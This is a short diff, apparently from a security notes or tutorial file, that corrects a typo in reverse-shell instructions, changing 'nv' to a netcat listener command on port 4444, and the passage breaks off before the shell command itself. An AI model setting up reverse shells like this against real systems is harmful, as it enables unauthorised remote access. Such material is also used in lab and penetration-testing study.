@@ -1,7 +1,7 @@
  - To get a reverse shell:
  - first open the listener on your machine:
- ```shell
- nv -lvnp 4444
+```shell
+ nc -lvnp 4444
 ```
 - then use the command
 ```shell
